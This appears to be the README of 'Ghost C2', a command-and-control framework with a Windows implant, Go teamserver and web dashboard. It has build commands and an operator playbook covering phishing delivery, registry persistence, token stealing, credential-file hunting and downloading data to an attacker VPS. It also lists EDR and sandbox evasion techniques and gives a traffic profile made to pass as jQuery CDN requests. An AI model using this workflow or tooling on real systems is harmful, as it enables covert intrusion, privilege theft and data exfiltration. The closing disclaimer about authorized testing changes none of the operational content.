# 👻 Ghost C2

Yet another C2 framework, because apparently we need more of those. This one's actually pretty clean though - modular design, decent evasion, and doesn't look like it was written in a weekend (it wasn't, it was written in several weekends).

**What's inside:**
- **Agent** - Windows implant in pure C. No .NET, no PowerShell, just good old syscalls.
- **Teamserver** - Go backend. Handles sessions, tasks, the usual.
- **Web UI** - React dashboard because terminals are for nerds (jk I love terminals)
- **Malleable Profiles** - Make your traffic look like jQuery requests or whatever

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         OPERATOR                                 │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐        │
│  │   Web UI      │  │   CLI Console │  │   REST API    │        │
│  │   (React)     │  │   (Terminal)  │  │   (HTTP)      │        │
│  └───────┬───────┘  └───────┬───────┘  └───────┬───────┘        │
│          │                  │                  │                 │
│          └──────────────────┼──────────────────┘                 │
│                             │                                    │
│  ┌──────────────────────────▼──────────────────────────┐        │
│  │              TEAMSERVER (Go)                        │        │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐            │        │
│  │  │ Sessions │ │ Tasks    │ │ Profiles │            │        │
│  │  └──────────┘ └──────────┘ └──────────┘            │        │
│  │  ┌──────────────────────────────────────┐          │        │
│  │  │      HTTP/HTTPS Listener             │          │        │
│  │  └──────────────────────────────────────┘          │        │
│  └─────────────────────────┬────────────────────────────┘        │
└────────────────────────────┼─────────────────────────────────────┘
                             │ (Encrypted C2 Traffic)
                             │
┌────────────────────────────▼─────────────────────────────────────┐
│                       TARGET NETWORK                              │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │                   DEMON AGENT (C)                            │ │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐            │ │
│  │  │ Evasion │ │ Crypto  │ │ Tasks   │ │ Network │            │ │
│  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘            │ │
│  └─────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────┘
```

## Project Layout

```
c2-server/
├── agent/                    # The implant (C)
│   ├── include/              # common.h, ntdefs.h
│   ├── src/
│   │   ├── core/             # Main loop, config
│   │   ├── crypto/           # AES, XOR, b64
│   │   ├── evasion/          # The fun stuff
│   │   ├── network/          # HTTP comms
│   │   ├── tasks/            # Command handlers
│   │   └── utils/            # Helpers
│   └── Makefile
│
├── server/                   # Teamserver (Go)
│   ├── cmd/                  # main.go
│   ├── internal/             # api, cli, crypto, listener, etc
│   └── pkg/protocol/         # Shared message structs
│
├── web/                      # Dashboard (React + Vite)
│   └── src/
│
└── profiles/                 # Traffic profiles (yaml)
    ├── default.yaml
    ├── jquery.yaml           # Looks like CDN traffic
    └── microsoft.yaml        # Looks like Windows Update
```

## Platform Requirements

| Component | Language | Runs On | Dev/Build On |
|-----------|----------|---------|---------------|
| **Agent** | C | Windows only | Mac/Linux (cross-compile with MinGW) |
| **Teamserver** | Go | Mac/Linux/Windows | Any |
| **Web UI** | React | Browser | Any |

> **Important**: The agent uses Windows APIs (winhttp, ntdll) and produces a `.exe`. You **cross-compile** it from Mac/Linux using `mingw-w64`, then deploy the binary to the Windows target. The teamserver and web UI run natively on your operator machine.

## Getting Started

### You'll need

- Go 1.21+
- MinGW-w64 (for cross-compiling the agent)
- Node 18+

### Setup

```bash
# macOS
brew install mingw-w64

# Get Go deps
cd server && go mod download

# Get npm deps
cd web && npm install
```

### Build Agent

```bash
cd agent
make check    # verify mingw is there
make exe      # -> bin/ghost.exe
make dll      # -> bin/ghost.dll
```

### Run Teamserver

```bash
cd server

# Basic
go run cmd/main.go

# Custom config
go run cmd/main.go -api-port 3000 -listener-port 443 -profile profiles/jquery.yaml
```

### Run Web UI

```bash
cd web
npm run dev
# http://localhost:5173
```

## Commands

Once you have an agent callback, here's what you can do:

### Basics

| Cmd | What it does |
|-----|--------------|
| `shell <cmd>` | Run cmd.exe command |
| `pwd` | Where am I |
| `cd <path>` | Go somewhere else |
| `ls` | List files (or `dir`, same thing) |

### File Ops

| Cmd | What it does |
|-----|--------------|
| `download <file>` | Pull file from target |
| `upload <file>` | Push file to target |

### Process Stuff

| Cmd | What it does |
|-----|--------------|
| `ps` | List processes |
| `kill <pid>` | Kill a process |

### Recon

| Cmd | What it does |
|-----|--------------|
| `whoami` | Username, domain, privs |
| `sysinfo` | OS, arch, hostname, IPs |

### Tokens

| Cmd | What it does |
|-----|--------------|
| `token_list` | See available tokens |
| `token_steal <pid>` | Yoink a token |

### Agent Control

| Cmd | What it does |
|-----|--------------|
| `sleep <sec>` | Change beacon interval |
| `persist` | Add persistence |
| `exit` | Bye bye |

## REST API

| Endpoint | Method | Notes |
|----------|--------|-------|
| `/api/stats` | GET | Dashboard numbers |
| `/api/agents` | GET | List agents |
| `/api/agents/:id` | GET | Agent details |
| `/api/agents/:id` | DELETE | Remove agent |
| `/api/agents/:id/task` | POST | Send command |
| `/api/agents/:id/tasks` | GET | Task history |

---

## Workflow

Here's how you'd actually use this thing:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK WORKFLOW                                    │
└─────────────────────────────────────────────────────────────────────────────┘

 ┌──────────────────┐
 │  1. SETUP        │
 │  Infrastructure  │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  Deploy VPS  ──►  Start Teamserver  ──►  Configure Profile          │
 │                                                                       │
 │  $ go run cmd/main.go -profile profiles/jquery.yaml -listener 443   │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  2. COMPILE      │
 │  Agent Payload   │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  Edit config.h with C2 URL  ──►  make exe  ──►  ghost.exe           │
 │                                                                       │
 │  C2_URL = "https://your-vps.com"                                     │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  3. DELIVERY     │
 │  Initial Access  │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  Phishing / USB / Exploit  ──►  Target executes ghost.exe           │
 │                                                                       │
 │  Agent auto-registers with teamserver and starts beaconing          │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  4. ENUMERATION  │
 │  Initial Recon   │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  Recommended first commands after callback:                         │
 │                                                                       │
 │  ghost (agent-1) ► whoami          # Who am I?                      │
 │  ghost (agent-1) ► sysinfo         # What system?                   │
 │  ghost (agent-1) ► pwd             # Where am I?                    │
 │  ghost (agent-1) ► ps              # What's running?                │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  5. PERSISTENCE  │
 │  Stay Resident   │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► persist registry    # Survive reboots           │
 │  ghost (agent-1) ► sleep 300           # Low and slow (5 min)      │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  6. PRIVILEGE    │
 │  Escalation      │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► token_list          # Find SYSTEM/Admin tokens   │
 │  ghost (agent-1) ► token_steal 1234    # Impersonate high priv     │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  7. POST-EXPLOIT │
 │  Collection      │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► shell dir /s *.docx      # Find documents       │
 │  ghost (agent-1) ► download C:\secrets.db   # Exfil files          │
 │  ghost (agent-1) ► shell net user /domain   # AD enumeration       │
 └──────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  8. CLEANUP      │
 │  Exit Cleanly    │
 └────────┬─────────┘
          │
          ▼
 ┌──────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► exit                # Clean shutdown            │
 └──────────────────────────────────────────────────────────────────────┘
```

### Quick Ref

| Scenario | Commands |
|----------|----------|
| First foothold | `whoami` → `sysinfo` → `pwd` → `ps` |
| Hunt for creds | `shell dir /s *password*.txt` → `download` |
| Token grab | `ps` → `token_steal <pid>` |
| Lateral prep | `shell net view /domain` |
| Exfil | `ls C:\Users\target\Documents` → `download` |
| Stay quiet | `sleep 600` → `persist registry` |

## Evasion

The agent does some stuff to avoid detection:

| Technique | Notes |
|-----------|-------|
| PEB Walking | Resolve APIs without GetProcAddress (no IAT entries) |
| Indirect Syscalls | Skip ntdll hooks |
| String Encryption | XOR at runtime |
| Anti-Debug | PEB flags, timing checks, debug port |
| Sandbox Detection | Checks CPU count, RAM, uptime, VM artifacts |
| Sleep Obfuscation | Encrypt heap during sleep (WIP) |

## Malleable Profiles

You can customize how traffic looks. Example - pretend to be jQuery:

```yaml
# profiles/jquery.yaml
name: "jquery-cdn"
http:
  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
  get:
    uri:
      - "/jquery-3.6.0.min.js"
      - "/jquery-ui.min.js"
    transform:
      prepend: "/*! jQuery v3.6.0 */\n"
      append: "\n//# sourceMappingURL=jquery.min.map"
```

Network defenders see: "oh just someone loading jQuery"

## ⚠️ Legal

This is for authorized testing and research only. Don't be stupid. Don't use this on systems you don't own or have permission to test. I'm not responsible if you get fired/arrested/both.

## License

Educational purposes. See LICENSE.
